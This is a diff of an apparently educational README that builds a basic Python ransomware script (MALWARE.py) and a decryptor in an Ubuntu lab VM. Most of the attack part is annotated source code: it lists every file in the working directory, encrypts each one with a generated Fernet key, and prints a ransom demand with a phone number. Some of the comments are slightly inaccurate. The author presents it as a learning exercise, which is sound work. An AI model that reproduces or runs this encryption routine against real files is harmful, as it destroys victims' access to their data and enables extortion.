@@ -1,85 +1,93 @@
-## Ransomware
+<h3>Ransomware</h3> 
 
 Ransomware deployment using Python scripting
 
-## Objective
+<h3>Objective</h3> 
 
 As ransomware attacks have been on a steady upward trend, I wanted to take the time to understand the mechanics of one of the most popular cyberattacks methods.
 
-### Skills Learned
-
+<h3>Skills Learned</h3> 
 
 - Python scripting
-- Cryptography
- 
 
-### Tools Used
+- Cryptography
+
+<h3>Tools Used</h3> 
 
 - Python
+
 - Linux VM  
+
 - Fernet
 
-## Steps
+Steps
 
 First we are going to spin up an Ubuntu VM
 
 Next we will create a directory with several files that we are going to test our ransomware on.
 
-So we insert into the CLI "mkdir ransomware" to create the directory and inside the directory, run "echo "file content" > filename.txt" a few times to create several files.
+So we insert into the CLI "mkdir ransomware101" to create a directory. 
 
-Next we will create the malware script file.
+In the directory we will run "echo "file content" > filename.txt" //  We will run this serveral times to create files: file.txt, file2.txt, file3.txt.
+
+Next we will create the malware script.
+
+<h3>Creating the Ransomware Script</h3>
 
 ![Encryption](https://github.com/user-attachments/assets/edf5a8c4-e0b2-4010-b4cf-8c5a9ea1bffd)
 
-ref:
+Ref 2: Creating The Encryption Script (MALWARE.py) 
+
+The ransomware script will be titled, "MALWARE.py".
 
 To make this project easier to read I will briefly notate each line of code seperated by "//" to explain its utility in the script.
 
-First we have to include the shebang #! so that Linux runs the file as a script.
+#!/usr/bin/env python3 // First we have to include the shebang for our Python script. This tells Linux to run the file as a Python script. 
+ 
+Import os // Allows Python to interact with the OS.
 
-Import os // allows python to interact with the OS.
+from cryptography.fernet import Fernet // This imports Fernet so we can use its encryption 128bit encryption abilities. For the script to run properly we need to run "pip install crpytography" in the Linux terminal to install the necessary Python modules.
 
-from cryptography.fernet import Fernet // 128bit AES
-
-files = [] // This will create an empty list called files.
+files = [] // This will create an empty list called "files".
 
 for file in os.listdir() // This is a for loop and will list all the files in the directory.
 
-if os.path.isfile(file) // if object is a file add to encryption list
+if os.path.isfile(file) // If object is a file, add to the file list
 
-if file == "MALWARE.py" or file == "thekey.key" or file == "DECRYPT.py": //
+if file == "MALWARE.py" or file == "thekey.key" or file == "DECRYPT.py": // We are about to create a conditional statement to exclude these files from the list
 
-continue // this tells the script to continue to the next statement and skip the current iteration, meaning the files in the if statement above will be excluded from the rest of the script. 
+continue // This tells the script to continue to the next statement and skip the current iteration, meaning the files in the if statement above will be excluded from the rest of the script. 
 
-files.append(file) // This will add(append) any file to the files list.
+files.append(file) // This will append(add) any file targeted in the for loop to the files list.
 
 print(files) // Will display the "files" list in the terminal.
 
 key = Fernet.generate_key() // This will generate the encryption key.
 
-with open("thekey.key", "wb") as thekey: // This line uses the open function to open the file in script in write mode and reference the variable as "thekey" throughout the script.
+with open("thekey.key", "wb") as thekey: // This line uses the open function to open the file in write mode and reference the file as "thekey" throughout the script.
 
-for file in files: // This is creating a loop for the file's in the files list created earlier.
+for file in files: // This is creating a loop for the file's in the "files" list created earlier.
 
 with open(file, "rb") as thefile: // This line will open the file's in the list in read binary mode and assigned the alias "thefile".
 
-contents = thefile.read() // we have now made contents a alias to the file.read.
+contents = thefile.read() // we have now made contents a alias to the file. This will allow us to plug in the data into the Fernet module.
 
-contents_encrypted = Fernet(key).encrypt(contents) // This line encrypt the contents with the Fernet key.
+contents_encrypted = Fernet(key).encrypt(contents) // This line encrypts the contents variable with the Fernet key.
 
-with open(file, "wb") as thefile: // sets script to write to "thefile".
+with open(file, "wb") as thefile: // Sets the script to write back to "thefile".
 
-thefile.write(contents_encrypted) // writes the "contents_encrypted" to the file.
+thefile.write(contents_encrypted) // Writes the "contents_encrypted" to the file.
 
 print("All of your files have been encrypted. Contact 890-589-5542 to decrypt your data, for a price") // This is displayed in the terminal when the Python script is executed
 
 
+<h3>Decryption Sequence</h3> 
 
-DECRYPT
+
 
 ![Decryption](https://github.com/user-attachments/assets/5d1837e5-909c-4cf7-9fe0-a973e5fd3e94)
 
-ref:
+Ref 2: Creating The Decryption Script (DECRYPT.py)
 
 The first half of the script from the beginning up until the "print(files)" line is the same as the MALWARE.py script, I will not reiterate these lines for obvious reasons.
 
@@ -110,6 +118,8 @@ Lets test our scripts!
 
 ![results](https://github.com/user-attachments/assets/ef007d90-74cf-40ae-b97d-67d0827bd6ac)
 
+Ref 3: Execution both the Encryption/Decryption Scripts
+
 cat file2.txt // This will display the contents of a the files.
 
 cat thekey.key // Here I am showing the 128bit encryption key, this file is appended from the file list that becomes encrypted in our MALWARE.py script, 
@@ -137,8 +147,5 @@ cat file2.txt // Now when we check our file we have the original contents of the
 
 
 
-with = resource management as = used along with to allocater where to input resources / for = loop
-
-NO DROPPER
 
 *Ref 1: Network Diagram*
